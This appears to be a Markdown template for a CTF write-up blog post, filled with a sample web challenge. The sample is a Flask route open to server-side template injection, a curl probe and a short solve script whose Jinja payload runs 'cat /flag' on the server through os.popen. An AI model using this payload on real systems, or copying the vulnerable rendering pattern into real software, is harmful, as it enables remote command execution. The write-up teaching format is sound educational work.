---
title: "CTF Writeup — <Challenge Name>"
date: 2026-08-10 12:00:00 +0000   # set to when you publish; +0000 is your UTC offset
categories: [CTF, Web]            # [Top, Sub]  e.g. [CTF, Pwn] / [CTF, Crypto] / [CTF, Rev]
tags: [ctf, web, xss]             # always lowercase
description: One-line summary of the challenge and the bug (shows in previews & SEO).
# --- optional extras (delete lines you don't need) ---
# image:                          # cover / preview image
#   path: /assets/img/ctf/<event>/cover.png
#   alt: Challenge banner
# pin: false                      # true = pin to top of home page
# math: true                      # enable if you use $...$ LaTeX
# mermaid: true                   # enable if you use mermaid diagrams
# toc: true                       # table of contents (on by default)
# comments: true
---

## Challenge

| | |
|---|---|
| **Event** | `<CTF name / year>` |
| **Category** | Web |
| **Points / Difficulty** | 200 · Medium |
| **Author** | `<challenge author>` |

> Paste the challenge description / prompt here.
{: .prompt-info }

Files provided: `app.py`, `Dockerfile`. Remote: `nc chall.example.com 1337`.

## Recon

What the app/binary does, what stood out. Screenshots or code snippets:

```python
@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template_string(f"Hello {name}!")   # <-- SSTI here
```
{: file="app.py" }

## The Vulnerability

Explain the bug and *why* it exists. Keep it tight — one clear paragraph beats five vague ones.

> The user input is concatenated straight into a Jinja template, so `{{ 7*7 }}` renders as `49` → server-side template injection.
{: .prompt-danger }

## Exploitation

Walk through the steps. Show the payload and the actual commands you ran:

```bash
curl 'http://chall.example.com:1337/greet?name={{config}}'
```

Full exploit script:

```python
import requests

BASE = "http://chall.example.com:1337"
payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}"
print(requests.get(f"{BASE}/greet", params={"name": payload}).text)
```
{: file="solve.py" }

## Flag

```text
flag{r3plac3_w1th_th3_r3al_fl4g}
```

> **Takeaway:** never pass untrusted input into `render_template_string`; use `render_template` with proper context variables.
{: .prompt-tip }
